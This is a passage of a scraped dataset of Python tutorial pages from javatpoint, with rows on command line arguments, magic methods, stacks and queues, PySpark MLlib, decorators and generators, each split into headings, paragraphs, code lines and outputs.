x[1])', 'print(""Second last element:"", x[-1])']","['First element: 2', 'Second element: 4', 'Second last element: 8', ""array('i', [0, 2, 3, 5, 7, 10])"", ""array('i' ,[0, 2, 4, 6, 8, 10])"", ""array('i', [10, 20, 40, 60])"", ""Array c= array('d', [1.1, 2.1, 3.1, 2.6, 7.8, 3.7, 8.6])"", 'First element: 4', 'Second element: 7', 'Second last element: 22']",[],['|||Index starts with 0.|||We can access each element via its index.|||The length of the array defines the capacity to store the elements.||||||Traverse - It prints all the elements one by one.|||Insertion - It adds an element at the given index.|||Deletion - It deletes an element at the given index.|||Search - It searches an element using the given index or by the value.|||Update - It updates an element at the given index.|||']
48,['Python Command line arguments'],"['The Python supports the programs that can be run on the command line, complete with command line arguments. It is the input parameter that needs to be passed to the script when executing them.']","['https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial']",[],[],"['What is argument passing?', 'Why to use argparse?', 'Access command line arguments', 'Python sys module', 'Python getopt module', 'Python argparse module', 'How to use command line arguments in python?']",[],[],"['It means to interact with a command-line interface for the scripts.', 'It provides a getopt module, in which command line arguments and options can be parsed.', 'The command ls is often used to get a summary of files and folders present in a particular directory.', 'The Python sys module provides access to command-line arguments via sys.argv. It solves the two purposes:', 'It is very similar to C getopt() function for parsing command line parameters.', 'It is useful in parsing command line arguments where we want the user to enter some options.', 'getopt.getopt method', 'This method is used for parsing the command line options and parameter list.', 'args- It is an argument list that needs to be parsed.', 'options- A string of option letters that the script wants to recognize, with options that require an argument which should be followed by a colon(:).', 'long_options(optional)- It must be a string with names of the long options, which should be supported.', 'Exception getopt.GetoptError', 'This exception arises when an unrecognized option is found in the argument list or when any option requiring an argument is given none.', 'Docopt is used to create command line interfaces.', 'Python Fire automatically generates a command line interface; you only need one line of code. Unlike the other modules, it works instantly.', ""You don't need to define any arguments; all the methods are linked by default."", 'To install it type:', 'Define or use a class:', 'You have the options matching to the class methods:']","['It means to communicate between the writer of a program and user which does not require going into the code and making changes to the script. It provides the ability to a user to enter into the command-line arguments.', 'It stores command-line arguments into a list; we can access it using sys.argv. This is very useful and a simple way to read command-line arguments as String.', 'The Python getopt module extends the separation of the input string by parameter validation. Based on getopt C function, it allows both short and long options, including a value assignment.', 'It makes it easy to write the user-friendly command-line interfaces. It automatically generates help and usage messages and issues errors when a user gives invalid arguments to the program.', 'The argument to the exception is a string that indicates the cause of the error. The attributes msg and opt to give the error message and related option. ']","['It is a basic module that was shipped with Python distribution from the early days on. It is a similar approach as C library using argc/argv to access the arguments. The sys module implements command-line arguments in a simple list structure named sys.argv.', 'Each list element represents a single argument. The first one -- sys.argv[0] -- is the name of Python script. The other list elements are sys.argv[1] to sys.argv[n]- are the command line arguments 2 to n. As a delimiter between arguments, space is used. Argument values that contain space in it have to be quoted, accordingly.', 'It offers a command-line interface with standardized output, whereas the former two solutions leave most of the work in your hands. argparse allows verification of fixed and optional arguments with a name checking as either UNIX or GNU style. It is the preferred way to parse command-line arguments. It provides a lot of option such as positional arguments, the default value for arguments, helps message, specifying the data type of argument etc.']","['import sys', 'print(type(sys.argv))', ""print('The command line arguments are:')"", 'for i in sys.argv:', 'print(i)', 'import getopt', 'import sys', 'argv = sys.argv[1:]', ""opts, args = getopt.getopt(argv, 'hm:d', ['help', 'my_file='])"", 'print(opts)', 'print(args)', 'except getopt.GetoptError:', '# Print a message or do something useful', ""print('Something went wrong!')"", 'sys.exit(2)', 'getopt.getopt(args, options, [long_options])', '#!/usr/bin/python', 'import sys, getopt', 'def main(argv):', ""inputfile = ''"", ""outputfile = ''"", 'try:', 'opts, args = getopt.getopt(argv,""hi:o:"",[""ifile="",""ofile=""])', 'except getopt.GetoptError:', ""print 'test.py -i <inputfile> -o <outputfile>'"", 'sys.exit(2)', 'for opt, arg in opts:', ""if opt == '-h':"", ""print 'test.py -i <inputfile> -o <outputfile>'"", 'sys.exit()', 'elif opt in (""-i"", ""--ifile""):', 'inputfile = arg', 'elif opt in (""-o"", ""--ofile""):', 'outputfile = arg', 'print \'Input file is ""\', inputfile', 'print \'Output file is ""\', outputfile', 'if __name__ == ""__main__"":', 'main(sys.argv[1:])', 'from docopt import docopt', ""if __name__ == '__main__':"", ""arguments = docopt(__doc__, version='Example 1')"", 'print(arguments)', 'pip install fire', 'import fire', 'class Python(object):', 'def hello(self):', 'print(""Hello"")', 'def openfile(self, filename):', 'print(""Open file \'"" + filename + ""\'"")', ""if __name__ == '__main__':"", 'fire.Fire(Python)', 'python example.py hello', 'python example.py openfile filename.txt']","['$ test.py -h', 'usage: test.py -i <inputfile> -o <outputfile>', '$ test.py -i BMP -o', 'usage: test.py -i <inputfile> -o <outputfile>', '$ test.py -i inputfile', 'Input file is "" inputfile', 'Output file is ""']",['Module|||Use|||Python version&&&sys|||All arguments in sys.argv (basic)|||All&&&argparse|||Build a command line interface|||>= 2.3&&&docopt|||Created command line interfaces|||>= 2.5&&&fire|||Automatically generate command line interfaces (CLIs)|||All&&&optparse|||Deprecated|||< 2.7'],"[""|||This method returns a value consisting of two elements, i.e. list of (option, value) pairs, list of program arguments left after option list was stripped.|||Each option-and-value pair are returned as an option as its first element, prefixed with a hyphen for short options (e.g.,'-x') or two hyphens for long options (e.g., '--long-option').|||""]"
49,['Python magic method'],"['Python magic method is defined as the special method which adds ""magic"" to a class. It starts and ends with double underscores, for example, _init_ or _str_.']","['https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial']",[],[],[],[],[],"['It is most frequently used to define the overloaded behaviors of predefined operators. ', 'This function computes ""informal"" or a nicely printable string representation of an object and must return a string object. ', 'This function should return the length of an object.', 'We can make an object callable by adding the _call_ magic method, and it is another method that is not needed quite as often is _call_. ', 'If defined in a class, then that class can be called. But if it was a function, instance itself rather than modifying. ', 'Just as _init_, which is a constructor method, _del_ is like a destructor. If you have opened a file in _init _, then _del_ can close it. ', 'It offers to compute a byte-string representation of an object and should return a string object.', 'This method gets invoked when >= operator is used and returns True or False.', 'This function gets called for the unary operator.', 'This function gets called on the exponents with arguments. e.g. a**=b.', 'This function gets called on comparison using <= operator.', 'This function returns the Boolean value of the object. It gets invoked when the bool (self) function is called.']","['The built-in classes define many magic methods. The dir() function can be used to see the number of magic methods inherited by a class. It has two prefixes, and suffix underscores in the method name.', 'This function is called by the repr() built-in function to compute the ""official"" string representation of an object and returns a machine-readable representation of a type. The goal of the _repr_ is to be unambiguous. ']","['The _init_ method is called after the instance of the class has been created but before it returned to the caller. It is invoked without any call, when an instance of the class is created like constructors in other programming languages such as C++, Java, C#, PHP, etc. These methods are also known as initialize and are called after _new_. Its where you should initialize the instance variables.']",[],[],[],[]
50,['Python Stack and Queue'],['Data structure organizes the storage in computers so that we can easily access and change data. Stacks and Queues are the earliest data structure defined in computer science. A simple Python list can act as a queue and stack as well. A queue follows FIFO rule (First In First Out) and used in programming for sorting. It is common for stacks and queues to be implemented with an array or linked list.'],"['https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial']","['https://static.javatpoint.com/python/images/python-stack-and-queue.png', 'https://static.javatpoint.com/python/images/python-stack-and-queue-1.png', 'https://static.javatpoint.com/python/images/python-stack-and-queue-2.png', 'https://static.javatpoint.com/python/images/python-stack-and-queue-3.png']",[],"['Stack', 'Queue']",['Code'],"['Note: The implementation of a queue is a little bit different. A queue follows the ""First-In-First-Out"". Time plays an important factor here. The Stack is fast because we insert and pop the elements from the end of the list, whereas in the queue, the insertion and pops are made from the beginning of the list, so it becomes slow. The cause of this time difference is due to the properties of the list, which is fast in the end operation but slow at the beginning operations because all other elements have to be shifted one by one.']","['A Stack is a data structure that follows the LIFO(Last In First Out) principle. To implement a stack, we need two simple operations:', 'Operations:', 'Characteristics:', 'To implement a queue, we need two simple operations:', 'Operations on Queue', 'Characteristics']",['A Queue follows the First-in-First-Out (FIFO) principle. It is opened from both the ends hence we can easily add elements to the back and can remove elements from the front.'],[],"['# Code to demonstrate Implementation of', '# stack using list', 'x = [""Python"", ""C"", ""Android""]', 'x.push(""Java"")', 'x.push(""C++"")', 'print(x)', 'print(x.pop())', 'print(x)', 'print(x.pop())', 'print(x)', 'import queue', ""# Queue is created as an object 'L'"", 'L = queue.Queue(maxsize=10)', ""# Data is inserted in 'L' at the end using put()"", 'L.put(9)', 'L.put(6)', 'L.put(7)', 'L.put(4)', '# get() takes data from', '# from the head', '# of the Queue', 'print(L.get())', 'print(L.get())', 'print(L.get())', 'print(L.get())']","[""['Python', 'C', 'Android', 'Java', 'C++']"", 'C++', ""['Python', 'C', 'Android', 'Java']"", 'Java', ""['Python', 'C', 'Android']"", '9', '6', '7', '4']",[],"['|||push - It adds an element to the top of the stack.|||pop - It removes an element from the top of the stack.||||||Adding - It adds the items in the stack and increases the stack size. The addition takes place at the top of the stack.|||Deletion - It consists of two conditions, first, if no element is present in the stack, then underflow occurs in the stack, and second, if a stack contains some elements, then the topmost element gets removed. It reduces the stack size.|||Traversing - It involves visiting each element of the stack.||||||Insertion order of the stack is preserved.|||Useful for parsing the operations.|||Duplicacy is allowed.||||||enqueue - It adds an element to the end of the queue.|||dequeue - It removes the element from the beginning of the queue.||||||Addition - It adds the element in a queue and takes place at the rear end, i.e., at the back of the queue.|||Deletion - It consists of two conditions - If no element is present in the queue, Underflow occurs in the queue, or if a stack contains some elements then element present at the front gets deleted.|||Traversing - It involves to visit each element of the queue.||||||Insertion order of the queue is preserved.|||Duplicacy is allowed.|||Useful for parsing CPU task operations.|||']"
51,['PySpark MLlib'],['Machine Learning is a technique of data analysis that combines data with statistical tools to predict the output. This prediction is used by the various corporate industries to make a favorable decision.'],"['https://www.javatpoint.com/python-decorator', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com/python-decorator', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-decorator']",[],[],"['MLlib Features', 'MLlib K- Mean Cluster']","['MLlib Linear Regression', 'Parameters of PySpark MLlib', 'Collaborative Filtering (mllib.recommendation)', 'Scaling of the regularization parameter', 'Cold-start strategy']",[],"['The mllib.linalg utilities are used for linear algebra.', 'The mllib package supports many other algorithms, classes, and functions. Here we will understand the basic concept of pyspak.mllib.', 'The PySpark mllib is useful for iterative algorithms. The features are the following:', ""Let's have a look at the essential libraries of PySpark MLlib."", 'Linear regression is used to find the relationship and dependencies between variables. Consider the following code:', 'In the following code, we are importing the VectorAssembler library to create a new column Independent feature:', 'PySpark provides the LinearRegression() function to find the prediction of any given dataset. The syntax is given below:', 'The few important parameters of PySpark MLlib are given below:', 'It is RDD of Ratings or (userID, productID, rating) tuple.', 'It represents Rank of the computed feature matrices (number of features).', 'It represents the number of iterations of ALS. (default: 5)', 'It is the Regularization parameter. (default : 0.01)', 'It is used to parallelize the computation of some number of blocks.']","['The fpm means frequent pattern matching, which is used for mining various items, itemsets, subsequences, or other substructure. It is mostly used in large-scale datasets.', 'The regression is used to find the relationship and dependencies between variables. It finds the correlation between each feature of data and predicts the future values.', 'The K- Mean cluster algorithm is one of the most popular and commonly used algorithms. It is used to cluster the data points into a predefined number of clusters. The below example is showing the use of MLlib K-Means Cluster library:']","[""PySpark provides an API to work with the Machine learning called as mllib. PySpark's mllib supports various machine learning algorithms like classification, regression clustering, collaborative filtering, and dimensionality reduction as well as underlying optimization primitives. Various machine learning concepts are given below:"", 'The pyspark.mllib library supports several classification methods such as binary classification, multiclass classification, and regression analysis. The object may belong to a different class. The objective of classification is to differentiate the data based on the information. Random Forest, Naive Bayes, Decision Tree are the most useful algorithms in classification.', 'Clustering is an unsupervised machine learning problem. It is used when you do not know how to classify the data; we require the algorithm to find patterns and classify the data accordingly. The popular clustering algorithms are the K-means clustering, Gaussian mixture model, Hierarchical clustering.', 'It is used to define the relevant data for making a recommendation. It is capable of predicting future preference and recommending the top items. For example, Online entertainment platform Netflix has a huge collection of movies, and sometimes people face difficulty in selecting the favorite items. This is the field where the recommendation plays an important role.', 'Collaborative filtering is a technique that is generally used for a recommender system. This technique is focused on filling the missing entries of a user-item. Association matrix spark.ml currently supports model-based collaborative filtering. In collaborative filtering, users and products are described by a small set of hidden factors that can be used to predict missing entries.', 'The regularization parameter regParam is scaled to solve least-squares problem. The least-square problem occurs when the number of ratings are user-generated in updating user factors, or the number of ratings the product received in updating product factors.', 'The ALS Model (Alternative Least Square Model) is used for prediction while making a common prediction problem. The problem encountered when user or items in the test dataset occurred that may not be present during training the model. It can occur in the two scenarios which are given below:']","['frompyspark.sql import SparkSession', ""spark = SparkSession.builder.appName('Customer').getOrCreate()"", 'frompyspark.ml.regression import LinearRegression', ""dataset = spark.read.csv(r'C:\\Users\\DEVANSH SHARMA\\Ecommerce-Customers.csv')"", 'dataset.show(10)', 'frompyspark.ml.linalg import Vectors', 'frompyspark.ml.feature import VectorAssembler', 'featureassembler = VectorAssembler(inputCols = [""Avg Session Length"",""Time on App"",""Time on Website""],outputCol = ""Independent Features"")', 'output = featureassembler.transform(dataset)', 'output.show()', 'z = featureassembler.transform(dataset)', 'finlized_data = z.select(""Indepenent feature"", ""Yearly Amount Spent"",)', 'z.show()', ""regressor = LinearRegression(featureCol = 'column_name1', labelCol = 'column_name2 ')"", 'from pyspark.ml.clustering import KMeans', 'from pyspark.ml.evaluation import ClusteringEvaluator', '# Loads data.', 'dataset = spark.read.format(""libsvm"").load(r""C:\\Users\\DEVANSH SHARMA\\Iris.csv"")', '# Trains a k-means model.', 'kmeans = KMeans().setK(2).setSeed(1)', 'model = kmeans.fit(dataset)', '# Make predictions', 'predictions = model.transform(dataset)', '# Evaluate clustering by computing Silhouette score', 'evaluator = ClusteringEvaluator()', 'silhouette = evaluator.evaluate(predictions)', 'print(""Silhouette with squared euclidean distance = "" + str(silhouette))', '# Shows the result.', 'centers = model.clusterCenters()', 'print(""Cluster Centers: "")', 'for center in centers:', 'print(center)', '#importing the libraries', 'frompyspark.ml.evaluation import RegressionEvaluator', 'frompyspark.ml.recommendation import ALS', 'frompyspark.sql import Row', 'no_of_lines = spark.read.text(r""C:\\Users\\DEVANSH SHARMA\\MovieLens.csv"").rdd', 'no_of_parts = no_of_lines.map(lambda row: row.value.split(""::""))', 'ratingsRDD = no_of_lines.map(lambda p: Row(userId=int(p[0]), movieId=int(p[1]),', 'rating=float(p[2]), timestamp=long(p[3])))', 'ratings = spark.createDataFrame(ratingsRDD)', '(training, test) = ratings.randomSplit([0.8, 0.2])', '# Develop the recommendation model using ALS on the training data', ""# Note we set cold start strategy to make sure that we don't get NaN evaluation metrics."", 'als = ALS(maxIter=5, regParam=0.01, userCol=""userId"", itemCol=""movieId"", ratingCol=""rating"",', 'coldStartStrategy=""drop"")', 'model = als.fit(training)', '# Calculate the model by computing the RMSE on the test data', 'predictions = model.transform(test)', 'evaluator = RegressionEvaluator(metricName=""rmse"", labelCol=""rating"",', 'predictionCol=""prediction"")', 'rmse = evaluator.evaluate(predictions)', 'print(""Root-mean-square error = "" + str(rmse))', '# Evaluate top 10 movie recommendations for each user', 'userRecs = model.recommendForAllUsers(10)', '# Evaluate top 10 user recommendations for each movie', 'movieRecs = model.recommendForAllItems(10)', '# Evaluate top 10 movie recommendations for a specified set of users', 'users = ratings.select(als.getUserCol()).distinct().limit(3)', 'userSubsetRecs = model.recommendForUserSubset(users, 10)', '# Evalute top 10 user recommendations for a specified set of movies', 'movies = ratings.select(als.getItemCol()).distinct().limit(3)', 'movieSubSetRecs = model.recommendForItemSubset(movies, 10)']","['+--------------------+--------------------+----------------+------------------+------------------+------------------+--------------------+-------------------+', '|                 _c0|                 _c1|             _c2|               _c3|               _c4|               _c5|                 _c6|                _c7|', '+--------------------+--------------------+----------------+------------------+------------------+------------------+--------------------+-------------------+', '|               Email|             Address|          Avatar|Avg Session Length|       Time on App|   Time on Website|Length of Membership|Yearly Amount Spent|', '|[email\xa0protected]|835 Frank TunnelW...|          Violet| 34.49726772511229| 12.65565114916675| 39.57766801952616|  4.0826206329529615|  587.9510539684005|', '|   [email\xa0protected]|4547 Archer Commo...|       DarkGreen| 31.92627202636016|11.109460728682564|37.268958868297744|    2.66403418213262|  392.2049334443264|', '|    [email\xa0protected]|24645 Valerie Uni...|          Bisque|33.000914755642675|11.330278057777512|37.110597442120856|   4.104543202376424| 487.54750486747207|', '|[email\xa0protected]|1414 David Throug...|     SaddleBrown| 34.30555662975554|13.717513665142507| 36.72128267790313|   3.120178782748092|  581.8523440352177|', '|[email\xa0protected]|14023 Rodriguez P...|MediumAquaMarine| 33.33067252364639|12.795188551078114| 37.53665330059473|   4.446308318351434|  599.4060920457634|', '|[email\xa0protected]|645 Martha Park A...|     FloralWhite|33.871037879341976|12.026925339755056| 34.47687762925054|   5.493507201364199|   637.102447915074|', '|[email\xa0protected]|68388 Reyes Light...|   DarkSlateBlue| 32.02159550138701|11.366348309710526| 36.68377615286961|   4.685017246570912|  521.5721747578274|', '|  [email\xa0protected]|Unit 6538 Box 898...|            Aqua|32.739142938380326| 12.35195897300293| 37.37335885854755|  4.4342734348999375|  549.9041461052942|', '|[email\xa0protected]|860 Lee KeyWest D...|          Salmon| 33.98777289568564|13.386235275676436|37.534497341555735|  3.2734335777477144|  570.2004089636196|', '+--------------------+--------------------+----------------+------------------+------------------+------------------+--------------------+-------------------+', 'only showing top 10 rows', '+------------------+', 'Independent Feature', '+------------------+', '|34.49726772511229 |', '|31.92627202636016 |', '|33.000914755642675|', '|34.30555662975554 |', '|33.33067252364639 |', '|33.871037879341976|', '|32.02159550138701 |', '|32.739142938380326|', '|33.98777289568564 |', '+------------------+', '+--------------------++-------------------+', '|Independent Feature | Yearly Amount Spent|', '+--------------------++-------------------+', '|34.49726772511229   | 587.9510539684005  |', '|31.92627202636016   | 392.2049334443264  |', '|33.000914755642675  | 487.5475048674720  |', '|34.30555662975554   | 581.8523440352177  |', '|33.33067252364639   | 599.4060920457634  |', '|33.871037879341976  | 637.102447915074   |', '|32.02159550138701   | 521.5721747578274  |', '|32.739142938380326  | 549.9041461052942  |', '|33.98777289568564   | 570.2004089636196  |', '+--------------------++-------------------+']",[],"['|||classification||||||clustering||||||fpm||||||linalg||||||recommendation||||||mllib regression||||||Extraction: It extracts features from ""row"" data.|||Transformation: It is used for scaling, converting, or modifying features.|||Selection: Selecting a useful subset from a larger set of features.|||Locality Sensitive Hashing: It combines aspects of feature transformation with other algorithms.||||||Ratings||||||Rank||||||Iterations||||||Lambda||||||Blocks||||||In the prediction, the model is not trained for users and items that have no rating history (it is called a cold-start strategy).|||The data is splitted between training and evaluation sets during cross-validation. It is widespread to encounter users and items in the evaluation set that are not in the training set.|||']"
52,['Python Decorator'],"['Decorators are one of the most helpful and powerful tools of Python. These are used to modify the behavior of the function. Decorators provide the flexibility to wrap another function to expand the working of wrapped function, without permanently modifying it.']","['https://www.javatpoint.com/python-generators', 'https://www.javatpoint.com/pyspark-mllib', 'https://www.javatpoint.com/python-generators', 'https://www.javatpoint.com/pyspark-mllib', 'https://www.javatpoint.com/python-generators']",[],[],"['What are the functions in Python?', 'Inner Function', 'Fancy Decorators']","['Decorating functions with parameters', 'Syntactic Decorator', 'Reusing Decorator', 'Python Decorator with Argument', 'Returning Values from Decorated Functions', 'Class Decorators', 'Singleton Class', 'Nesting Decorators', 'Decorator with Arguments', 'Stateful Decorators', 'Classes as Decorators']","['Note: Decorator with argument is not frequently used in programming, but it provides flexibility. We can use it with or without argument.']","['It is also called meta programming where a part of the program attempts to change another part of program at compile time.', 'Before understanding the Decorator, we need to know some important concepts of Python.', 'A function that accepts other function as an argument is also called higher order function. Consider the following example:', 'In the above program, we have passed the sub() function and add() function as argument in operator() function.', 'A function can return another function. Consider the below example:', 'In the above program, the hi() function is nested inside the hello() function. It will return each time we call hi().', ""Let's have an example to understand the parameterized decorator function:"", 'We can import mod_decorator.py in other file. ', ""We want to pass some arguments in function. Let's do it in following code:"", 'Now wrapper_function() can accept any number of argument and pass them on the function. ', 'We can control the return type of the decorated function. The example is given below:', ""Let's understand the fancy decorators by the following topic:"", 'Example: 1- @property decorator - By using it, we can use the class function as an attribute. Consider the following code:', 'A singleton class only has one instance. There are many singletons in Python including True, None, etc.', ""We can use multiple decorators by using them on top of each other. Let's consider the following example:"", 'In the above code, we have used the nested decorator by stacking them onto one another. ', 'To making a class callable, we implement the special __call__() method.', 'The __init__() method stores a reference to the function and can do any other required initialization.']","['In the above program, when we run the code it give the same output for both functions. The func2 referred to function func1 and act as function. We need to understand the following concept of the function:', 'Python provides the facility to define the function inside another function. These types of functions are called inner functions. Consider the following example:', ""In the above program, it doesn't matter how the child functions are declared. The execution of the child function makes effect on the output. These child functions are locally bounded with the func() so they cannot be called separately."", 'In the above program, we have decorated out_div() that is little bit bulky. Instead of using above method, Python allows to use decorator in easy way with @symbol. Sometimes it is called ""pie"" syntax.', ""We can reuse the decorator as well by recalling that decorator function. Let's make the decorator to its own module that can be used in many other functions. Creating a file called mod_decorator.py with the following code:"", ""As we can see that, the function didn't accept the argument. Running this code raises an error. We can fix this error by using *args and **kwargs in the inner wrapper function. Modifying the decorator.py as follows:"", 'Example:2 - @staticmethod decorator- The @staticmethod is used to define a static method in the class. It is called by using the class name as well as instance of the class. Consider the following code:', 'It is always useful to pass arguments in a decorator. The decorator can be executed several times according to the given value of the argument. Let us consider the following example:', 'In the above example, @repeat refers to a function object that can be called in another function. The @repeat(num = 5) will return a function which acts as a decorator.', 'The above code may look complex but it is the most commonly used decorator pattern where we have used one additional def that handles the arguments to the decorator.', 'Stateful decorators are used to keep track of the decorator state. Let us consider the example where we are creating a decorator that counts how many times the function has been called. ', 'In the above program, the state represented the number of calls of the function stored in .num_calls on the wrapper function. When we call say_hello() it will display the number of the call of the function.']","['Python has the most interesting feature that everything is treated as an object even classes or any variable we define in Python is also assumed as an object. Functions are first-class objects in the Python because they can reference to, passed to a variable and returned from other functions as well. The example is given below:', 'Python provides two ways to decorate a class. Firstly, we can decorate the method inside a class; there are built-in decorators like @classmethod, @staticmethod and @property in Python. The @classmethod and @staticmethod define methods inside class that is not connected to any other instance of a class. The @property is generally used to modify the getters and setters of a class attributes. Let’s understand it by the following example:', 'The classes are the best way to maintain state. In this section, we will learn how to use a class as a decorator. Here we will create a class that contains __init__() and take func as an argument. The class needs to be callable so that it can stand in for the decorated function.']","['def func1(msg):', 'print(msg)', 'func1(""Hii"")', 'func2 = func1', 'func2(""Hii"")', 'def func():', 'print(""We are in first function"")', 'def func1():', 'print(""This is first child function"")', 'def func2():', 'print("" This is second child function"")', 'func1()', 'func2()', 'def add(x):', 'return x+1', 'def sub(x):', 'return x-1', 'def operator(func, x):', 'temp = func(x)', 'return temp', 'print(operator(sub,10))', 'print(operator(add,20))', 'def hello():', 'def hi():', 'print(""Hello"")', 'return hi', 'new = hello()', 'def divide(x,y):', 'print(x/y)', 'def outer_div(func):', 'def inner(x,y):', 'if(x', 'def outer_div(func):', 'def inner(x,y):', 'if(x', 'def do_twice(func):', 'def wrapper_do_twice():', 'func()', 'func()', 'return wrapper_do_twice', 'from decorator import do_twice', '@do_twice', 'def say_hello():', 'print(""Hello There"")', 'say_hello()', 'from decorator import do_twice', '@do_twice', 'def display(name):', 'print(f""Hello {name}"")', 'display()', 'def do_twice(func):', 'def wrapper_function(*args,**kwargs):', 'func(*args,**kwargs)', 'func(*args,**kwargs)', 'return wrapper_function', 'from decorator import do_twice', '@do_twice', 'def display(name):', 'print(f""Hello {name}"")', 'display(""John"")', 'from decorator import do_twice', '@do_twice', 'def return_greeting(name):', 'print(""We are created greeting"")', 'return f""Hi {name}""', 'hi_adam = return_greeting(""Adam"")', 'class Student:', 'def __init__(self,name,grade):', 'self.name = name', 'self.grade = grade', '@property', 'def display(self):', 'return self.name + "" got grade "" + self.grade', 'stu = Student(""John"",""B"")', 'print(""Name:"", stu.name)', 'print(""Grade:"", stu.grade)', 'print(stu.display)', 'class Person:', '@staticmethod', 'def hello():', 'print(""Hello Peter"")', 'per = Person()', 'per.hello()', 'Person.hello()', '@function1', '@function2', 'def function(name):', 'print(f ""{name}"")', 'Import functools', 'def repeat(num):', '#Creating and returning a wrapper function', 'def decorator_repeat(func):', '@functools.wraps(func)', 'def wrapper(*args,**kwargs):', 'for _ in range(num):', 'value = func(*args,**kwargs)', 'return value', 'return wrapper', 'return decorator_repeat', '#Here we are passing num as an argument which repeats the print function', '@repeat(num=5)', 'def function1(name):', 'print(f""{name}"")', 'Import functools', 'def count_function(func):', '@functools.wraps(func)', 'def wrapper_count_calls(*args, **kwargs):', 'wrapper_count_calls.num_calls += 1', 'print(f""Call{wrapper_count_calls.num_calls} of {func.__name__!r}"")', 'return func(*args, **kwargs)', 'wrapper_count_calls.num_calls = 0', 'return wrapper_count_calls', '@count_function', 'def say_hello():', 'print(""Say Hello"")', 'say_hello()', 'say_hello()', 'import functools', 'class Count_Calls:', 'def __init__(self, func):', 'functools.update_wrapper(self, func)', 'self.func = func', 'self.num_calls = 0', 'def __call__(self, *args, **kwargs):', 'self.num_calls += 1', 'print(f""Call{self.num_calls} of {self.func.__name__!r}"")', 'return self.func(*args, **kwargs)', '@Count_Calls', 'def say_hello():', 'print(""Say Hello"")', 'say_hello()', 'say_hello()', 'say_hello()']","['Hii', 'Hii', 'We are in first function', 'This is first child function', 'This is second child function', '9', '21', 'Hello', '2.0', '2.0', 'Hello There', 'Hello There', ""TypeError: display() missing 1 required positional argument: 'name'"", 'Hello John', 'Hello John', 'We are created greeting', 'We are created greeting', 'Name: John', 'Grade: B', 'John got grade B', 'Hello Peter', 'Hello Peter', 'JavatPoint', 'JavatPoint', 'JavatPoint', 'JavatPoint', 'JavatPoint', ""Call 1 of 'say_hello'"", 'Say Hello', ""Call 2 of 'say_hello'"", 'Say Hello', ""Call 1 of 'say_hello'"", 'Say Hello', ""Call 2 of 'say_hello'"", 'Say Hello', ""Call 3 of 'say_hello'"", 'Say Hello']",[],['|||The function can be referenced and passed to a variable and returned from other functions as well.|||The functions can be declared inside another function and passed as an argument to another function.|||']
53,['Python Generators'],['Python Generators are the functions that return the traversal object and used to create iterators. It traverses the entire items at once. The generator can also be an expression in which syntax is similar to the list comprehension in Python.'],"['https://www.javatpoint.com/web-scraping-using-python', 'https://www.javatpoint.com/python-decorator', 'https://www.javatpoint.com/web-scraping-using-python', 'https://www.javatpoint.com/python-decorator', 'https://www.javatpoint.com/web-scraping-using-python']",[],[],"['What is Python Generator?', 'How to Create Generator function in Python?', 'Advantages of Generators']","['yield vs. return', 'Difference between Generator function and Normal function', 'Generator Expression', '1. Easy to implement', '2. Memory efficient', '3. Pipelining with Generators']","['Note:- When we call the next(), Python calls __next__() on the function in which we have passed it as a parameter.']","['There is a lot of complexity in creating iteration in Python; we need to implement __iter__() and __next__() method to keep track of internal states.', 'The return statement returns a value and terminates the whole function and only one return statement can be used in the function.', 'Using multiple yield Statement', 'We can use the multiple yield statement in the generator function. Consider the following example.', 'Consider the following example:', 'In the above program, we have used the next() function, which returned the next item of the list.', 'Example: Write a program to print the table of the given number using the generator.', 'In the above example, a generator function is iterating using for loop.', 'There are various advantages of Generators. Few of them are given below:', 'Generators are easy to implement as compared to the iterator. In iterator, we have to implement __iter__() and __next__() function.', 'Data Pipeline provides the facility to process large datasets or stream of data without using extra computer memory. ', '4. Generate Infinite Sequence', 'In this tutorial, we have learned about the Python Generators.']","[""It is a lengthy process to create iterators. That's why the generator plays an essential role in simplifying this process. If there is no value found in iteration, it raises StopIteration exception."", ""We can easily create a generator expression without using user-defined function. It is the same as the lambda function which creates an anonymous function; the generator's expressions create an anonymous generator function."", 'We can observe from the above output that list comprehension is using 4508 bytes of memory, whereas generator expression is using 56 bytes of memory. It means that generator objects are much efficient than the list compression.', 'The generator can produce infinite items. Infinite sequences cannot be contained within the memory and since generators produce only one item at a time, consider the following example:']","['It is quite simple to create a generator in Python. It is similar to the normal function defined by the def keyword and uses a yield keyword instead of return. Or we can say that if the body of any function contains a yield statement, it automatically becomes a generator function. Consider the following example:', 'The yield statement is responsible for controlling the flow of the generator function. It pauses the function execution by saving all states and yielded to the caller. Later it resumes execution when a successive function is called. We can use the multiple yield statement in the generator function.', 'The representation of generator expression is similar to the Python list comprehension. The only difference is that square bracket is replaced by round parentheses. The list comprehension calculates the entire list, whereas the generator expression calculates one item at a time.', ""In the above program, list comprehension has returned the list of cube of elements whereas generator expression has returned the reference of calculated value. Instead of applying a for loop, we can also call next() on the generator object. Let's consider another example:"", ""Generators are memory efficient for a large number of sequences. The normal function returns a sequence of the list which creates an entire sequence in memory before returning the result, but the generator function calculates the value and pause their execution. It resumes for successive call. An infinite sequence generator is a great example of memory optimization. Let's discuss it in the below example by using sys.getsizeof() function."", 'Suppose we have a log file from a famous restaurant. The log file has a column (4th column) that keeps track of the number of burgers sold every hour and we want to sum it to find the total number of burgers sold in 4 years. In that scenario, the generator can generate a pipeline with a series of operations. Below is the code for it:']","['def simple():', 'for i in range(10):', 